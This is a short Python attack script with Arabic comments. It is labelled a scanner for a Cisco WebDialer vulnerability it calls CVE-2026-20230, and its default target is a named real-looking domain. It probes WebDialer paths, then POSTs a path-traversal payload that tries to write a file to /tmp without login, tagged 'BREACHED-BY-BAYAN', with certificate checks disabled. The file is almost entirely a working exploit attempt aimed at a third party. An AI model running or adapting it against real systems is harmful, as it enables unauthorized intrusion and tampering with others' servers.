#!/usr/bin/env python3
"""
💣 Cisco CVE-2026-20230 Scanner
يبحث عن WebDialer ويكتب ملفات بدون تسجيل دخول
"""
import requests, sys, socket

TARGET = sys.argv[1] if len(sys.argv) > 1 else "beeorder.com"

print(f"💣 Cisco CVE-2026-20230: {TARGET}")
print("═" * 50)

# 1. فحص WebDialer
print("\n1️⃣ فحص WebDialer:")
paths = ["/webdialer", "/ccmwebdialer", "/dialer"]
for path in paths:
    try:
        r = requests.get(f"https://{TARGET}{path}", timeout=5, verify=False)
        if r.status_code != 404:
            print(f"   🚨 {path} → {r.status_code}")
    except:
        pass

# 2. محاولة استغلال CVE-2026-20230
print("\n2️⃣ محاولة استغلال File Write:")
payload = {
    "file": "../../../../../../../../../../tmp/hacked.txt",
    "data": "BREACHED-BY-BAYAN"
}
for path in paths:
    try:
        r = requests.post(f"https://{TARGET}{path}/write", 
            data=payload, timeout=5, verify=False)
        if r.status_code == 200:
            print(f"   🚨 {path} → File Written!")
    except:
        pass

print("\n✅ اكتمل")
